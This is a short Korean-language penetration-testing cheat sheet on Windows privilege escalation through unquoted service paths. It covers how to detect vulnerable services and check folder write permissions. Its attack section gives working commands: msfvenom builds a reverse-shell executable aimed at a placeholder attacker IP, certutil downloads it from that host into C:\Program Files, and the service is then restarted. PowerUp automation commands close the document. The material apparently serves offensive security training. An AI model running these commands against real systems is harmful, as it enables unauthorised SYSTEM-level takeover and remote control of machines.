# 04_UnquotedServicePath

# 윈도우 권한상승 — Unquoted Service Path

경로에 공백이 있고 따옴표로 묶이지 않은 서비스. Windows가 각 공백 위치에서 실행 파일을 탐색함.

---

## 탐지

```bash
:: 따옴표 없는 공백 포함 경로 찾기
wmic service get name,displayname,pathname,startmode ^
  | findstr /i "auto" ^
  | findstr /i /v "c:\windows\\" ^
  | findstr /i /v """"

:: PowerUp
Get-UnquotedService

:: sc로 개별 확인
sc qc <서비스명>
:: BINARY_PATH_NAME에 따옴표 없으면 취약
```

---

## 원리

경로가 `C:\Program Files\Vuln Service\Common Files\service.exe` 이면

Windows가 순서대로 탐색:
1. `C:\Program.exe`
2. `C:\Program Files\Vuln.exe`
3. `C:\Program Files\Vuln Service\Common.exe`
4. `C:\Program Files\Vuln Service\Common Files\service.exe`

---

## 쓰기 가능한 경로 확인

```bash
icacls "C:\Program Files\Vuln Service"
icacls "C:\Program Files"

:: 찾는 권한:(W),(F),(M)
```

---

## 공격

```bash
# 칼리에서 페이로드 생성
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<칼리IP> LPORT=4444 \
  -f exe -o Vuln.exe
```

```bash
:: 공백 직전 위치에 악성 EXE 배치
certutil -urlcache -split -f http://<칼리IP>/Vuln.exe "C:\Program Files\Vuln.exe"

:: 서비스 재시작
net stop vulnsvc && net start vulnsvc
:: 또는 재부팅
shutdown /r /t 0
```

---

## PowerUp 자동화

```powershell
Get-UnquotedService | Invoke-ServiceAbuse
Write-ServiceBinary -Name 'vulnsvc' -Path 'C:\Program Files\Vuln.exe'
```